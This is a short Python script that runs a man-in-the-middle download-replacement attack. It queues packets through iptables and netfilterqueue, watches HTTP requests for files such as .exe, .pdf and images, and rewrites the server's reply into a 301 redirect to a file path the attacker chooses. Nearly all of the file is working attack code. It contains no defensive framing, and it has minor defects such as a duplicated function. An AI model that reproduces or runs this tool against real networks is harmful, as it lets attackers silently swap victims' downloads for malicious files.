#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
from subprocess import (call, check_output)
from optparse import OptionParser


def get_args():
    parser = OptionParser()
    parser.add_option("-fp", "--file-path", dest="file", help="Direct file path to download instead of real one.")
    parser.add_option("-l", "--local", dest="local", help="(l/nl) Local or Nonlocal")

    (options, arguments) = parser.parse_args()
    return options


ack_list = []
exten = ["exe", "pdf", "jpg", "jpeg", "png", "txt", "mp3"]
options = get_args()

extensions = ["." + x for x in exten]


def iptable_rule(local=False):
    # noinspection PyInterpreter
    if local:
        call("iptables -I INPUT -j NFQUEUE --queue-num 1", shell=True)
        call("iptables -I OUTPUT -j NFQUEUE --queue-num 1", shell=True)
    else:
        call("iptables -I FORWARD -j NFQUEUE --queue-num 1", shell=True)


def process(packet):
    if packet:
        scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].sport == 10000:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                scapy_packet[scapy.TCP].load = "HTTP/1.1 301 Moved Permanently\nLocation: " + options.file + "\n\n"

                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.TCP].chksum
                del scapy_packet[scapy.IP].chksum
                packet.set_payload(str(scapy_packet))

        elif scapy_packet[scapy.TCP].dport == 10000:
            for extension in extensions:
                if extension in scapy_packet[scapy.Raw].load:
                    ack_list.append(scapy_packet[scapy.TCP].ack)
                    print("Spoofing exe")
    packet.accept()


def iptable_rule(local):
    if local:
        call("iptables -I INPUT -j NFQUEUE --queue-num 1", shell=True)
        call("iptables -I OUTPUT -j NFQUEUE --queue-num 1", shell=True)
    else:
        call("iptables -I FORWARD -j NFQUEUE --queue-num 1", shell=True)


local = False
if options.local == "l":
    local = True

iptable_rule(local)
queue = netfilterqueue.NetfilterQueue()
queue.bind(1, process)
queue.run()